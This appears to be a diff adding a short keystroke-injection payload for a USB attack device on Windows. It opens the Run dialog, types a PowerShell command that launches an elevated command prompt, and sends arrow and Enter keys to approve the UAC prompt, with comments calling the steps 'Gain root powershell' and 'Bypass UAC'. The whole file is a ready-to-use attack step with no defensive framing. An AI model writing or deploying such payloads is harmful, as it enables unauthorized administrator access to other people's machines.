@@ -1,0 +1,14 @@
+// Gain root powershell
+
+K: GUI, R
+SLEEP: 1
+
+S: powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/k'"
+K: ENTER
+SLEEP: 3
+
+// Bypass UAC
+K: LEFT_ARROW
+K: ENTER
+
+// READY
